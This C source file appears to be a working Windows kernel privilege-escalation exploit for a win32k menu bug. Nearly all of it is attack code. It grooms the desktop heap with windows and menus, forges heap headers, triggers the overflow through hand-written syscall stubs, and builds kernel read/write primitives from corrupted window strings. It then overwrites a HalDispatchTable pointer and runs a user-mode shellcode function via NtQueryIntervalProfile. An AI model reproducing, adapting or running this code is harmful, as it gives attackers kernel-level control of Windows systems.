

#pragma warning(disable: 4995) 

#include <windows.h>
#include <Strsafe.h>
#include <conio.h>
#include <string>
#include <Shlwapi.h>

#include "structs.h"

#define WNDTEXT_OFFSET			0x8c
#define TAGWND_BYTES			0xb0

#define FILL_HOLE_COUNT			0x100
#define OP_WND_COUNT			0x10

#define CORRUPTION_BLOCK_SIZE	0x8e8

UCHAR g_HandleStr[] = {0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC};
CHAR g_szClassName[] = "myWindowClass";
PVOID g_HaliQuerySystemInformation = NULL;

extern PVOID g_HalDispatchTable;

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	switch(msg)
	{
	case WM_CLOSE:
		DestroyWindow(hwnd);
		break;
	case WM_DESTROY:
		PostQuitMessage(0);
		break;
	default:
		return DefWindowProc(hwnd, msg, wParam, lParam);
	}

	return 0;
}

BOOL InitWindows(HWND* win, int count, BOOL Exdata)
{
	WNDCLASSEXA wc;

	wc.cbSize        = sizeof(WNDCLASSEX);
	wc.style         = 0;
	wc.lpfnWndProc   = WndProc;
	wc.cbClsExtra    = 0;
	wc.cbWndExtra    = 0;
	wc.hInstance     = NULL;
	wc.hIcon         = LoadIcon(NULL, IDI_APPLICATION);
	wc.hCursor       = LoadCursor(NULL, IDC_ARROW);
	wc.hbrBackground = (HBRUSH)(COLOR_WINDOW+1);
	wc.lpszMenuName  = NULL;
	wc.lpszClassName = g_szClassName;
	wc.hIconSm       = LoadIcon(NULL, IDI_APPLICATION);

	if (!RegisterClassExA(&wc))
	{
		if (GetLastError() != ERROR_CLASS_ALREADY_EXISTS)
			return FALSE;
	}

	for (int i = 0; i < count; i++)
	{
		win[i] = CreateWindowExA(
			0,
			g_szClassName,  
			0,
			WS_OVERLAPPEDWINDOW,
			CW_USEDEFAULT,
			CW_USEDEFAULT,
			CW_USEDEFAULT,
			CW_USEDEFAULT,
			(HWND) NULL,
			(HMENU) NULL,
			NULL,
			(PVOID) NULL
			);

		if (win[i] == NULL)
			return FALSE;

		if (Exdata)
		{
			SetPropA(win[i], (LPCSTR) (1), *(HANDLE *)g_HandleStr);		
		}
	}

	return TRUE;
}

//from user32.pdb
_declspec(naked) BOOL NTAPI 
NtUserThunkedMenuItemInfo(
	HMENU hMenu, 
	UINT nPosition, 
	BOOL fByPosition, 
	BOOL fInsert, 
	LPMENUITEMINFOW lpmii, 
	PUNICODE_STRING pstrItem)
{
	__asm{
		mov     eax, 1256h
		mov     edx, 7FFE0300h
		call    dword ptr [edx]
		retn    18h
	}

}

//from user32.pdb
_declspec(naked) BOOL NTAPI 
NtUserDefSetText(HWND hWnd, PLARGE_UNICODE_STRING pStrText)
{
	__asm{
		mov     eax, 116Dh
		mov     edx, 7FFE0300h
		call    dword ptr [edx]
		retn    8
	}
}

BOOL add_menu_item(HMENU hMenu, UINT wID)
{
	MENUITEMINFOW mi_info;
	mi_info.cbSize = sizeof(MENUITEMINFOW);
	mi_info.fMask = MIIM_ID;
	mi_info.fType = MFT_STRING;
	mi_info.fState = MFS_ENABLED;
	mi_info.wID = wID;

	return NtUserThunkedMenuItemInfo(
	hMenu,      //# HMENU hMenu
	-1,         //# UINT  nPosition
	TRUE,       //# BOOL  fByPosition
	TRUE,       //# BOOL  fInsert
	&mi_info,   //# LPMENUITEMINFOW lpmii
	NULL       //# PUNICODE_STRING pstrItem
	);
};

HMENU add_submenu_item(HMENU hMenu, UINT wID)
{
	HMENU hSubMenu = CreatePopupMenu();

	MENUITEMINFOW mi_info;
	mi_info.cbSize = sizeof(MENUITEMINFOW);
	mi_info.fMask = MIIM_SUBMENU | MIIM_ID | MIIM_BITMAP;
	mi_info.fState = MFS_ENABLED;
	mi_info.hSubMenu = hSubMenu;
	mi_info.wID = wID;
	mi_info.dwTypeData = NULL;
	mi_info.hbmpItem = HBMMENU_SYSTEM;  // (required to set nPosition to 1 in trigger)

	BOOL bRet = NtUserThunkedMenuItemInfo(
		hMenu,      //# HMENU hMenu
		0,          //# UINT  nPosition
		FALSE,      //# BOOL  fByPosition
		TRUE,       //# BOOL  fInsert
		&mi_info,   //# LPMENUITEMINFOW lpmii
		NULL       //# PUNICODE_STRING pstrItem
		);
	if (bRet)
	{
		return hSubMenu;
	}
	return NULL;
}


VOID fill_menu(HMENU hMenu, UINT Base_wID, UINT nCount)
{
	for (UINT i = 0; i < nCount; i ++)
	{
		add_menu_item(hMenu, Base_wID + i);
	}
}

BOOL trigger(HMENU hMenu, UINT wID, UINT nPosition, BOOL bByPosition)
{
	MENUITEMINFOW mi_info;
	mi_info.cbSize = sizeof(MENUITEMINFOW);
	mi_info.fMask = MIIM_STRING | MIIM_ID;
	mi_info.fType = MFT_STRING;
	mi_info.fState = MFS_ENABLED;
	mi_info.wID = wID;

	return NtUserThunkedMenuItemInfo(
		hMenu,      //# HMENU hMenu
		nPosition,  //# UINT  nPosition
		bByPosition,//# BOOL  fByPosition
		TRUE,       //# BOOL  fInsert
		&mi_info,   //# LPMENUITEMINFOW lpmii
		NULL        //# PUNICODE_STRING pstrItem
		);
}


NTSTATUS NTAPI ShellCode(
	PVOID arg1, 
	PVOID arg2,
	PVOID arg3, 
	PVOID arg4)
{
	//Fake HaliQuerySystemInformation

	//__asm int 3;

	//restore 
	*((PVOID *)g_HalDispatchTable + 1) = g_HaliQuerySystemInformation;

	return 0;
}

PVOID g_Addr = NULL;

int main()
{
	BOOL bRet;
	PVOID UserAddr, KernelAddr;
	HWND FillHoleWnd[FILL_HOLE_COUNT];
	HWND OpWnd[OP_WND_COUNT];
	LARGE_UNICODE_STRING LargeStr;
	UCHAR Data[0x1000];

	if(!GetKernelInfo())
		return -1;

	LogPrint("==================================\n");
	//step 1
	bRet = InitWindows(FillHoleWnd, FILL_HOLE_COUNT, TRUE);
	if (!bRet)
	{
		LogPrint("init heap hole error.\n"); 
		return -2;
	}

	//step 2
	bRet = InitWindows(OpWnd, OP_WND_COUNT, FALSE);
	if (!bRet)
	{
		LogPrint("init operat wnd error.\n"); 
		return -3;
	}

	//step 3
	HMENU hMenu = CreateMenu();
	HMENU hSubMenu = add_submenu_item(hMenu, 0x123);
	//LogPrint("add_submenu_item : %p\n", hSubMenu);
	fill_menu(hMenu, 0x1001, 7);

	//step 4
	bRet = add_menu_item(hSubMenu, 0x1);
	fill_menu(hSubMenu, 0x2001, 7);

	KernelAddr = GetMappedHandlePtr(hSubMenu, &UserAddr);
	ULONG_PTR Step04_offset = (ULONG_PTR)((PMENU)UserAddr)->rgItems;
	//LogPrint("Step04_offset : %p\n", Step04_offset);

	//step 5
	fill_menu(hSubMenu, 0x2008, 1);

	KernelAddr = GetMappedHandlePtr(hSubMenu, &UserAddr);
	ULONG_PTR SubMenuITEMs = (ULONG_PTR)((PMENU)UserAddr)->rgItems;
	ULONG_PTR SubMenuITEMsNext = SubMenuITEMs + 0x6c0 + sizeof(HEAP_ENTRY32);
	LogPrint("[Step05] SubMenuITEMs : %p, %p\n", SubMenuITEMs, SubMenuITEMsNext);

	//step 6
	//fill the hole of step 5
	memset(Data, 0x42, sizeof(Data));
	RtlInitLargeUnicodeString(&LargeStr, (LPCWCH)Data, -1, 0x360 - 2);
	bRet = NtUserDefSetText(OpWnd[5], &LargeStr);

	KernelAddr = GetMappedHandlePtr(OpWnd[5], &UserAddr);
	ULONG_PTR Step06_offset = *(ULONG_PTR *)((ULONG_PTR)UserAddr + WNDTEXT_OFFSET);
	//LogPrint("Step06_offset : %p (fill the hole of step 5)\n", Step06_offset);
	if(Step06_offset != Step04_offset)
	{
		LogPrint("[Step06] error, cannot fill the hole of step 5.\n"); 
		return -6;
	}

	//step 7
	//set WND-1 text 0x70, make corrupt heap header.
	memset(Data, 0, sizeof(Data));
	PHEAP_ENTRY32 pHeapEntry = (PHEAP_ENTRY32)(Data + 4);
	pHeapEntry->PreviousSize = (0x6c8 + 0x78) >> HEAP_GRANULARITY_SHIFT;
	pHeapEntry->Size = CORRUPTION_BLOCK_SIZE >> HEAP_GRANULARITY_SHIFT;
	pHeapEntry->Flags = 1;
	pHeapEntry->UnusedBytes = 8;

	RtlInitLargeUnicodeString(&LargeStr, (LPCWCH)Data, -1, 0x70 - 2);
	bRet = NtUserDefSetText(OpWnd[1], &LargeStr);

	KernelAddr = GetMappedHandlePtr(OpWnd[1], &UserAddr);
	ULONG_PTR WND_1_Text = *(ULONG_PTR *)((ULONG_PTR)UserAddr + WNDTEXT_OFFSET);
	ULONG_PTR WND_1_TextNext = WND_1_Text + 0x70 + sizeof(HEAP_ENTRY32);
	ULONG_PTR SavedBegin = WND_1_Text - sizeof(HEAP_ENTRY32);

	LogPrint("[Step07] WND_1_Text   : %p, %p\n", WND_1_Text, WND_1_TextNext);	
	if(WND_1_Text != SubMenuITEMsNext)
	{
		LogPrint("[Step07] error.\n"); 
		return -7;
	}

	//step 8
	memset(Data, 0, sizeof(Data));

	RtlInitLargeUnicodeString(&LargeStr, (LPCWCH)Data, -1, 0x70 - 2);
	bRet = NtUserDefSetText(OpWnd[2], &LargeStr);

	KernelAddr = GetMappedHandlePtr(OpWnd[2], &UserAddr);
	ULONG_PTR WND_2_Text = *(ULONG_PTR *)((ULONG_PTR)UserAddr + WNDTEXT_OFFSET);
	ULONG_PTR CorruptWndText = WND_2_Text;
	ULONG_PTR WND_2_TextNext = WND_2_Text + 0x70 + sizeof(HEAP_ENTRY32);
	LogPrint("[Step08] WND_2_Text   : %p, %p\n", WND_2_Text, WND_2_TextNext);
	if(WND_2_Text != WND_1_TextNext)
	{
		LogPrint("[Step08] error.\n"); 
		return -8;
	}

	//step 9

	memset(Data, 0, sizeof(Data));
	RtlInitLargeUnicodeString(&LargeStr, (LPCWCH)Data, -1, 0x6c0 - 2);
	bRet = NtUserDefSetText(OpWnd[0], &LargeStr);

	KernelAddr = GetMappedHandlePtr(OpWnd[0], &UserAddr);
	ULONG_PTR MenuITEMs = *(ULONG_PTR *)((ULONG_PTR)UserAddr + WNDTEXT_OFFSET);
	ULONG_PTR MenuITEMsNext = MenuITEMs + 0x6c0 + sizeof(HEAP_ENTRY32);
	LogPrint("[Step09] MenuITEMs    : %p, %p\n", MenuITEMs, MenuITEMsNext);
	if(MenuITEMs != WND_2_TextNext)
	{
		LogPrint("[Step09] error.\n"); 
		return -9;
	}

	//step 10
	HWND hPrimitiveWnd;
	bRet = InitWindows(&hPrimitiveWnd, 1, FALSE);

	KernelAddr = GetMappedHandlePtr(hPrimitiveWnd, &UserAddr);
	ULONG_PTR PrimitiveWnd = (ULONG_PTR)KernelAddr;
	ULONG_PTR PrimitiveWndNext = PrimitiveWnd + TAGWND_BYTES + sizeof(HEAP_ENTRY32) + sizeof(PROPLIST) + sizeof(HEAP_ENTRY32);
	LogPrint("[Step10] PrimitiveWnd : %p, %p\n", PrimitiveWnd, PrimitiveWndNext);
	if(PrimitiveWnd != MenuITEMsNext)
	{
		LogPrint("[Step10] error.\n"); 
		return -10;
	}

	//step 11
	HWND hCorruptWnd;
	bRet = InitWindows(&hCorruptWnd, 1, FALSE);

	KernelAddr = GetMappedHandlePtr(hCorruptWnd, &UserAddr);
	ULONG_PTR CorruptWnd = (ULONG_PTR)KernelAddr;
	ULONG_PTR CorruptWndNext = CorruptWnd + TAGWND_BYTES + sizeof(HEAP_ENTRY32) + sizeof(PROPLIST) + sizeof(HEAP_ENTRY32);
	LogPrint("[Step11] CorruptWnd   : %p, %p\n", CorruptWnd, CorruptWndNext);
	if(CorruptWnd != PrimitiveWndNext)
	{
		LogPrint("[Step11] error.\n"); 
		return -11;
	}

	//step 12
	//fake end block
	memset(Data, 0, sizeof(Data));

	pHeapEntry = (PHEAP_ENTRY32)Data;
	pHeapEntry->PreviousSize = CORRUPTION_BLOCK_SIZE >> HEAP_GRANULARITY_SHIFT;
	pHeapEntry->Size = 0x10 >> HEAP_GRANULARITY_SHIFT;
	pHeapEntry->Flags = 1;
	pHeapEntry->UnusedBytes = 8;

	RtlInitLargeUnicodeString(&LargeStr, (LPCWCH)Data, -1, 0x10 - 2);
	bRet = NtUserDefSetText(OpWnd[3], &LargeStr);

	KernelAddr = GetMappedHandlePtr(OpWnd[3], &UserAddr);
	ULONG_PTR WND_3_Text = *(ULONG_PTR *)((ULONG_PTR)UserAddr + WNDTEXT_OFFSET);
	ULONG_PTR CorruptWndTextEnd = WND_3_Text;
	ULONG_PTR SavedEnd = WND_3_Text + 0x10;
	LogPrint("[Step12] WND_3_Text   : %p\n", WND_3_Text);
	if(WND_3_Text != CorruptWndNext)
	{
		LogPrint("[Step12] error.\n"); 
		return -12;
	}

	LogPrint("memmove size      : %p\n", (ULONG_PTR)MenuITEMs - (ULONG_PTR)SubMenuITEMs + 0x360);
	ULONG CorruptWndTextSize = CorruptWndTextEnd - CorruptWndText;
	LogPrint("CorruptWndText    : %p + %p = %p\n", CorruptWndText, CorruptWndTextSize, CorruptWndTextEnd);
	PVOID CorruptWndTextUser = GetMappedUserlandPtr((PVOID)CorruptWndText);
	LogPrint("CorruptWndTextUser: %p\n", CorruptWndTextUser);

	//step 13 save
	ULONG_PTR SavedSize = SavedEnd - SavedBegin;
	if ((ULONG)SavedSize > 0x100000)
	{
		LogPrint("[Step13] error.\n"); 
		return -13;
	}
	PVOID pSaved = malloc(SavedSize);
	if (NULL == pSaved)
	{
		LogPrint("[Step13] error.\n"); 
		return -13;
	}
	memcpy(pSaved, GetMappedUserlandPtr((PVOID)SavedBegin), SavedSize);
	LogPrint("Saved to restore  : %p + %p = %p\n", SavedBegin, SavedSize, SavedEnd);

	LogPrint("Press 'c' to trigger bug ...\n"); 

	if( 0x63 == _getch())
	{
		//step 14
		memset(Data, 0x42, sizeof(Data));
		RtlInitLargeUnicodeString(&LargeStr, (LPCWCH)Data, -1, 0x700 - 2);
		bRet = NtUserDefSetText(OpWnd[0], &LargeStr);

		//step 15
		trigger(hMenu, 0, 0x123, FALSE);

		//step 16
		memset(Data, 0x43, sizeof(Data));
		RtlInitLargeUnicodeString(&LargeStr, (LPCWCH)Data, -1, 0x80 - 2);
		bRet = NtUserDefSetText(OpWnd[2], &LargeStr);

		KernelAddr = GetMappedHandlePtr(OpWnd[2], &UserAddr);
		PVOID WND_2_Text_New = *(PVOID *)((ULONG_PTR)UserAddr + WNDTEXT_OFFSET);
		LogPrint("[Step16] Realloc WND_2_Text : %p, free old WND_2_Text : %p\n", WND_2_Text_New, WND_2_Text);

		//step 17

		memcpy(Data, CorruptWndTextUser, CorruptWndTextSize);
		PLARGE_UNICODE_STRING pCorruptStr = (PLARGE_UNICODE_STRING)(Data + 0x78 + 0x6c8 + WNDTEXT_OFFSET - 8);

		pCorruptStr->MaximumLength = sizeof(PVOID);
		pCorruptStr->Length = sizeof(PVOID);
		pCorruptStr->Buffer = (PWSTR)((ULONG_PTR)g_HalDispatchTable + sizeof(PVOID));

		pCorruptStr = (PLARGE_UNICODE_STRING)(Data + 0x78 + 0x6c8 + 0xd0 + WNDTEXT_OFFSET - 8);
		pCorruptStr->MaximumLength = CorruptWndTextSize;
		pCorruptStr->Length = CorruptWndTextSize;
		pCorruptStr->Buffer = (PWSTR)(CorruptWndText);

		RtlInitLargeUnicodeString(&LargeStr, (LPCWCH)Data, -1, CorruptWndTextSize - 2);
		bRet = NtUserDefSetText(hCorruptWnd, &LargeStr);

		KernelAddr = GetMappedHandlePtr(hCorruptWnd, &UserAddr);
		PVOID Step17_offset = *(PVOID *)((ULONG_PTR)UserAddr + WNDTEXT_OFFSET);
		LogPrint("[Step17] CorruptWndText     : %p, use  old WND_2_Text : %p\n", Step17_offset, WND_2_Text);


		//step 18
		WCHAR pOut[0x80];
		InternalGetWindowText(hPrimitiveWnd, pOut, 0x80);
		g_HaliQuerySystemInformation = *(PVOID *)pOut;
		LogPrint("[Step18] Primitive read HaliQuerySystemInformation addr : %p\n", g_HaliQuerySystemInformation);

		*(PVOID *)Data = ShellCode;
		RtlInitLargeUnicodeString(&LargeStr, (LPCWCH)Data, -1, sizeof(PVOID) - 2);
		bRet = NtUserDefSetText(hPrimitiveWnd, &LargeStr);

		//step 19
		// trigger shellcode

		LogPrint("Press 'c' to trigger shellcode ...\n"); 
		if( 0x63 == _getch())
		{
			ULONG tmpRet;
			NTSTATUS Status = NtQueryIntervalProfile(2, &tmpRet);
		}

		//step 20

		memcpy(Data, CorruptWndTextUser, CorruptWndTextSize);
		pCorruptStr = (PLARGE_UNICODE_STRING)(Data + 0x78 + 0x6c8 + WNDTEXT_OFFSET - 8);
		pCorruptStr->MaximumLength = SavedSize;
		pCorruptStr->Length = SavedSize;
		pCorruptStr->Buffer = (PWSTR)SavedBegin;
		RtlInitLargeUnicodeString(&LargeStr, (LPCWCH)Data, -1, CorruptWndTextSize - 2);
		bRet = NtUserDefSetText(hCorruptWnd, &LargeStr);
		RtlInitLargeUnicodeString(&LargeStr, (LPCWCH)pSaved, -1, SavedSize - 2);
		bRet = NtUserDefSetText(hPrimitiveWnd, &LargeStr);

	}
	else
	{
		//step 14
		memset(Data, 0x42, sizeof(Data));
		RtlInitLargeUnicodeString(&LargeStr, (LPCWCH)Data, -1, 0x700 - 2);
		bRet = NtUserDefSetText(OpWnd[0], &LargeStr);

		KernelAddr = GetMappedHandlePtr(OpWnd[0], &UserAddr);
		PVOID Step14_offset = *(PVOID *)((ULONG_PTR)UserAddr + WNDTEXT_OFFSET);
		LogPrint("Step14_offset : %p\n", Step14_offset);
		//step 15
		fill_menu(hMenu, 0x2009, 1);
		KernelAddr = GetMappedHandlePtr(hMenu, &UserAddr);
		ULONG_PTR TestAddr = (ULONG_PTR)((PMENU)UserAddr)->rgItems;
		if (MenuITEMs == TestAddr)
			LogPrint("Step test OK\n");
		else
			LogPrint("Step test ERROR:%p\n", TestAddr);
	}

	LogPrint("Corruption completed.\nPress any key to exit...\n"); 
	_getch();

	for (int i = 0; i < FILL_HOLE_COUNT; i ++)
	{
		DestroyWindow(FillHoleWnd[i]);
	}

	for (int i = 0; i < OP_WND_COUNT; i ++)
	{
		DestroyWindow(OpWnd[i]);
	}

	DestroyMenu(hSubMenu);
	DestroyMenu(hMenu);

	if (pSaved)
		free(pSaved);

	return 0;
}